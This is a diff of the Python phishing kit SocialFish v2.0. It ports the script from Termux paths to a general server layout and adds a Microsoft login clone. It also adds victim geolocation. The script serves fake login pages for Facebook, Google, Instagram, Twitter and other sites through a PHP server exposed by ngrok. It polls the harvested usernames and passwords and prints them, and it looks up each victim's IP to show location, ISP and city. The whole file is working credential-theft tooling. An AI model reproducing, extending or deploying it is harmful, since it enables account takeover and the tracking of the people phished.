@@ -3,15 +3,18 @@
 #   SOCIALFISH v2.0
 #     by: An0nUD4Y
 #
-# TERMUX VERSION OF SOCIALFISH
-###############################
+###########################
 from time import sleep
 from sys import stdout, exit
 from os import system, path
+from distutils.dir_util import copy_tree
 import multiprocessing
-from urllib import urlopen
-from platform import architecture
+from urllib import urlopen, quote, unquote
+from platform import system as systemos, architecture
 from wget import download
+import re
+import json
+
 
 RED, WHITE, CYAN, GREEN, END = '\033[91m', '\33[46m', '\033[36m', '\033[1;32m', '\033[0m'
 
@@ -28,12 +31,11 @@ if connected() == False:
       \o__  /\|         ___] |__| |___ | |  | |___    |    | ___] |  |
           \|           
                     {0}[{1}!{0}]{1} Network error. Verify your connection.\n
-                    {0}[{1}!{0}]{1} By--------------> An0nUD4Y \n
 '''.format(RED, END)
      exit(0)
 
 def checkNgrok():
-    if path.isfile('ServerTermux/ngrok') == False: 
+    if path.isfile('Server/ngrok') == False: 
         print '[*] Downloading Ngrok...'
         if architecture()[0] == '64bit':
             filename = 'ngrok-stable-linux-arm.zip'
@@ -42,7 +44,7 @@ def checkNgrok():
         url = 'https://bin.equinox.io/c/4VmDzA7iaHb/' + filename
         download(url)
         system('unzip ' + filename)
-        system('mv ngrok ServerTermux/ngrok')
+        system('mv ngrok Server/ngrok')
         system('rm -Rf ' + filename)
         system('clear')
 checkNgrok()
@@ -67,49 +69,56 @@ def loadModule(module):
  .'       "-.,' / 
 ( AnonUD4Y  _.  < 
  `=.____.="  `._\\
+
+
  [{1}*{0}]{1} %s module loaded. Building site...{0}'''.format(CYAN, END) % module
 
 def runPhishing(social, option2):
-    system('rm -Rf ServerTermux/www/*.* && touch ServerTermux/www/usernames.txt && touch ServerTermux/www/iplog.txt')
+    system('rm -Rf Server/www/*.* && touch Server/www/usernames.txt && touch Server/www/ip.txt && cp WebPages/ip.php Server/www/')
     if option2 == '1' and social == 'Facebook':
-        system('cp WebPagesTermux/fb_standard/*.* ServerTermux/www/')
+        copy_tree("WebPages/fb_standard/", "Server/www/")
     if option2 == '2' and social == 'Facebook':
-        system('cp WebPagesTermux/fb_advanced_poll/*.* ServerTermux/www/')  
+        copy_tree("WebPages/fb_advanced_poll/", "Server/www/")     
     if option2 == '3' and social == 'Facebook':
-        system('cp WebPagesTermux/mobile_fb/*.* ServerTermux/www/')   
+        copy_tree("WebPages/fb_security_fake/", "Server/www/")  
     if option2 == '4' and social == 'Facebook':
-        system('cp WebPagesTermux/fb_security_fake/*.* ServerTermux/www/')  
-    if option2 == '5' and social == 'Facebook':
-        system('cp WebPagesTermux/fb_messenger/*.* ServerTermux/www/')         
+        copy_tree("WebPages/fb_messenger/", "Server/www/")         
     elif option2 == '1' and social == 'Google':
-        system('cp WebPagesTermux/google_standard/*.* ServerTermux/www/')
+        copy_tree("WebPages/google_standard/", "Server/www/")
     elif option2 == '2' and social == 'Google':
-        system('cp WebPagesTermux/google_advanced_poll/*.* ServerTermux/www/')
+        copy_tree("WebPages/google_advanced_poll/", "Server/www/")
     elif option2 == '3' and social == 'Google':
-        system('cp WebPagesTermux/google_advanced_web/*.* ServerTermux/www/')	
+        copy_tree("WebPages/google_advanced_web/", "Server/www/")   
     elif social == 'LinkedIn':
-        system('cp WebPagesTermux/linkedin/*.* ServerTermux/www/')
+        copy_tree("WebPages/linkedin/", "Server/www/")
     elif social == 'GitHub':
-        system('cp WebPagesTermux/GitHub/*.* ServerTermux/www/')
+        copy_tree("WebPages/GitHub/", "Server/www/")
     elif social == 'StackOverflow':
-        system('cp WebPagesTermux/stackoverflow/*.* ServerTermux/www/')
+        copy_tree("WebPages/stackoverflow/", "Server/www/")
     elif social == 'WordPress':
-        system('cp WebPagesTermux/wordpress/*.* ServerTermux/www/')
+        copy_tree("WebPages/wordpress/", "Server/www/")
     elif social == 'Twitter':
-        system('cp WebPagesTermux/twitter/*.* ServerTermux/www/')
+        copy_tree("WebPages/twitter/", "Server/www/")
     elif social == 'Snapchat':
-        system('cp WebPagesTermux/Snapchat_web/*.* ServerTermux/www/')
+        copy_tree("WebPages/Snapchat_web/", "Server/www/")
     elif social == 'Yahoo':
-        system('cp WebPagesTermux/yahoo_web/*.* ServerTermux/www/')
+        copy_tree("WebPages/yahoo_web/", "Server/www/")
     elif social == 'Twitch':
-        system('cp WebPagesTermux/twitch/*.* ServerTermux/www/')        	
+        copy_tree("WebPages/twitch/", "Server/www/")
+    elif social == 'Microsoft':
+        copy_tree("WebPages/live_web/", "Server/www/")	
     elif option2 == '1' and social == 'Instagram':
-        system('cp WebPagesTermux/Instagram_web/*.* ServerTermux/www/')
+        copy_tree("WebPages/Instagram_web/", "Server/www/")    
     elif option2 == '2' and social == 'Instagram':
-        system('cp WebPagesTermux/Instagram_autoliker/*.* ServerTermux/www/')
+        copy_tree("WebPages/Instagram_autoliker/", "Server/www/")
+
+
+
+        
+         
         
 def waitCreds():
-    print " {0}[{1}*{0}]{1} Hi Hacker Everything has been completed.... Start HAcking ".format(RED, END) 
+    print "{0}[{1}*{0}]{1} Hi Hacker Everything has been completed.............. Start HAcking ".format(RED, END) 
   
     print '''{0}
    _.-=-._     .-, 
@@ -122,26 +131,38 @@ def waitCreds():
    
     print " {0}[{1}*{0}]{1} Waiting for credentials & victim's info... \n".format(RED, END)
     while True:
-        with open('ServerTermux/www/usernames.txt') as creds:
+        
+        with open('Server/www/usernames.txt') as creds:
             lines = creds.read().rstrip()
         if len(lines) != 0: 
-            print '================================================='.format(RED, END)
+            print '======================================================================'.format(RED, END)
             print ' {0}[ CREDENTIALS FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
-            system('rm -rf ServerTermux/www/usernames.txt && touch ServerTermux/www/usernames.txt')
-            print '================================================='.format(RED, END)
+            system('rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt')
+            print '======================================================================'.format(RED, END)
             print ' {0}***** HOPE YOU ARE ENJOYING. SO PLEASE MAKE IT MORE POPULAR *****{1}\n {0}{1}'.format(RED, END)
             
         creds.close()
+        
 
-        with open('ServerTermux/www/iplog.txt') as creds:
+        with open('Server/www/ip.txt') as creds:
             lines = creds.read().rstrip()
         if len(lines) != 0: 
-            print '================================================='.format(RED, END)
+            ip = re.match('Victim Public IP: (.*?)\n', lines).group(1)
+            resp = urlopen('https://ipinfo.io/%s/json' % ip).read()
+            ipinfo = json.loads(resp)
+            matchObj = re.match('^(.*?),(.*)$', ipinfo['loc'])
+            latitude = matchObj.group(1)
+            longitude = matchObj.group(2)
+            print '======================================================================'.format(RED, END)
             print ' {0}[ VICTIM INFO FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
-            system('rm -rf ServerTermux/www/iplog.txt && touch ServerTermux/www/iplog.txt')
-            print '================================================='.format(RED, END)
-
+            print ' {0}Longitude: %s Latitude: %s{1}'.format(GREEN, END) % (longitude, latitude)
+            print ' {0}ISP: %s Country: %s{1}'.format(GREEN, END) % (ipinfo['org'], ipinfo['country'])
+            print ' {0}Region: %s City: %s{1}'.format(GREEN, END) % (ipinfo['region'], ipinfo['city'])
+            system('rm -rf Server/www/ip.txt && touch Server/www/ip.txt')
+            print '======================================================================'.format(RED, END)
+            
         creds.close()
+        
 
 def runPEnv():
     system('clear')
@@ -178,10 +199,10 @@ def runPEnv():
         system('clear')
         print '\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU NEED A GOOD MIND AND SOUL TO BE ONE OF US. GET AWAY FROM HERE AND DO NOT COME BACK WITH SAME MOTIVE. GOOD BYE!{1} ]\n'.format(RED, END)
         exit(0)
-    option = raw_input("\nSelect an option:\n\n {0}[{1}1{0}]{1} Facebook\n\n {0}[{1}2{0}]{1} Google\n\n {0}[{1}3{0}]{1} LinkedIn\n\n {0}[{1}4{0}]{1} GitHub\n\n {0}[{1}5{0}]{1} StackOverflow\n\n {0}[{1}6{0}]{1} WordPress\n\n {0}[{1}7{0}]{1} Twitter\n\n {0}[{1}8{0}]{1} Instagram\n\n {0}[{1}9{0}]{1} Snapchat\n\n {0}[{1}10{0}]{1} Yahoo\n\n {0}[{1}11{0}]{1} Twitch\n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED With An0nUD4Y !\n\n {0}SF-An0nUD4Y >  {1}".format(CYAN, END))
+    option = raw_input("\nSelect an option:\n\n {0}[{1}1{0}]{1} Facebook\n\n {0}[{1}2{0}]{1} Google\n\n {0}[{1}3{0}]{1} LinkedIn\n\n {0}[{1}4{0}]{1} GitHub\n\n {0}[{1}5{0}]{1} StackOverflow\n\n {0}[{1}6{0}]{1} WordPress\n\n {0}[{1}7{0}]{1} Twitter\n\n {0}[{1}8{0}]{1} Instagram\n\n {0}[{1}9{0}]{1} Snapchat\n\n {0}[{1}10{0}]{1} Yahoo\n\n {0}[{1}11{0}]{1} Twitch\n\n {0}[{1}12{0}]{1} Microsoft\n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED With An0nUD4Y !\n\n {0}SF-An0nUD4Y >  {1}".format(CYAN, END))
     if option == '1':
         loadModule('Facebook')
-        option2 = raw_input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n\n {0}[{1}3{0}]{1} Facebook Phishing- Mobile Version(mobile_mode)\n\n {0}[{1}4{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n\n {0}[{1}5{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED !\n\n {0}SF-An0nUD4Y > {1}".format(CYAN, END))
+        option2 = raw_input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n\n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED !\n\n {0}SF-An0nUD4Y > {1}".format(CYAN, END))
         runPhishing('Facebook', option2)
     elif option == '2':
         loadModule('Google')
@@ -209,7 +230,7 @@ def runPEnv():
         runPhishing('Twitter', option2)
     elif option == '8':
         loadModule('Instagram')
-        option2 =raw_input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (After submit redirects to original autoliker)\n\n  {0}SF-An0nUD4Y > {1}".format(CYAN, END))
+        option2 =raw_input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (After submit redirects to original autoliker)\n\n {0}[{1}------------->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED ! \n\n {0}SF-An0nUD4Y > {1}".format(CYAN, END))
         runPhishing('Instagram', option2)
     elif option == '9':
         loadModule('Snapchat')
@@ -222,27 +243,37 @@ def runPEnv():
     elif option == '11':
         loadModule('Twitch')
         option2 = ''
-        runPhishing('Twitch', option2)        
+        runPhishing('Twitch', option2) 
+    elif option == '12':
+        loadModule('Microsoft')
+        option2 = ''
+        runPhishing('Microsoft', option2)	
     else:
         exit(0)
 
 def runNgrok():
-    system('./ServerTermux/ngrok http 8080 > /dev/null &')
+    system('./Server/ngrok http 1111 > /dev/null &')
     sleep(10)
-    system('curl -s http://127.0.0.1:4040/status | grep -P "https://.*?ngrok.io" -oh > ngrokTermux.url')
-    url = open('ngrokTermux.url', 'r')
-    print('\n {0}[{1}*{0}]{1} Ngrok URL: {2}' + url.readlines()[0] + '{1}').format(CYAN, END, GREEN)
+    system('curl -s -N http://127.0.0.1:4040/status | grep -P "https://.*?ngrok.io" -oh > ngrok.url')
+    url = open('ngrok.url', 'r')
+    print('\n {0}[{1}*{0}]{1} Ngrok URL: {2}' + url.read() + '{1}').format(CYAN, END, GREEN)
     url.close()
 
-def runServerTermux():
-    system("cd ServerTermux/www/ && php -S 127.0.0.1:8080")
+def runServer():
+    system("cd Server/www/ && php -S 127.0.0.1:1111")
+
+
 
 if __name__ == "__main__":
     try:
         runPEnv()
         runNgrok()
-        multiprocessing.Process(target=runServerTermux).start()
+        multiprocessing.Process(target=runServer).start()
         waitCreds()
+        
+        
+    
+	
     except KeyboardInterrupt:
         system('pkill -f ngrok')
         end()
